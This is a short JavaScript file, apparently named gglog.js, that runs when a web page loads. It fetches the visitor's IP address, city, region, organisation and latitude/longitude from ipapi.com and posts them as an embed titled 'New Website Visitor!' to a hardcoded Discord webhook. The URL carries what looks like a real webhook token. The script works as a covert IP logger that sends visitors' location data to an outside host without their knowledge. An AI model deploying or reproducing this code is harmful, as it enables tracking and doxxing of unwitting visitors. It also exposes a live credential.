async function sendIpDataToDiscordWebhook() {
    // IMPORTANT: Your actual Discord Webhook URL
    const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1382399200913920092/barNepphDjsnqyhIA9DFcTOGxLtm4N-jVL71B-VhWkRsYpUyzf4kd6vuOE4xW-6TgYHP';

    // Basic check to ensure the webhook URL is set
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_DISCORD_WEBHOOK_URL_HERE')) {
        console.error('Error: Discord Webhook URL is not properly set. Please update gglog.js.');
        return;
    }

    try {
        // Step 1: Fetch IP data from ipapi.com
        const ipApiResponse = await fetch('https://ipapi.com/json/');
        if (!ipApiResponse.ok) {
            throw new Error(`Failed to fetch IP data: ${ipApiResponse.status} ${ipApiResponse.statusText}`);
        }
        const ipData = await ipApiResponse.json();

        // Step 2: Prepare data for Discord webhook
        const discordPayload = {
            embeds: [
                {
                    title: "New Website Visitor!",
                    description: "Visitor details from ipapi.com",
                    color: 3447003, // A nice blue color for the embed
                    fields: [
                        { name: "IP Address", value: ipData.ip || "N/A", inline: true },
                        { name: "Country", value: ipData.country_name || "N/A", inline: true },
                        { name: "City", value: ipData.city || "N/A", inline: true },
                        { name: "Region", value: ipData.region_name || "N/A", inline: true },
                        { name: "Organization", value: ipData.org || "N/A", inline: false },
                        { name: "Latitude", value: ipData.latitude ? ipData.latitude.toString() : "N/A", inline: true },
                        { name: "Longitude", value: ipData.longitude ? ipData.longitude.toString() : "N/A", inline: true },
                    ],
                    footer: {
                        text: `Data fetched at ${new Date().toLocaleString()}`
                    }
                }
            ]
        };

        // Step 3: Send data to Discord webhook
        const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(discordPayload),
        });

        if (!discordResponse.ok) {
            throw new Error(`Failed to send data to Discord: ${discordResponse.status} ${discordResponse.statusText}`);
        }

        console.log('IP data successfully sent to Discord webhook!');

    } catch (error) {
        console.error('Error sending IP data to Discord:', error);
    }
}

// Call the function when the page loads
sendIpDataToDiscordWebhook();
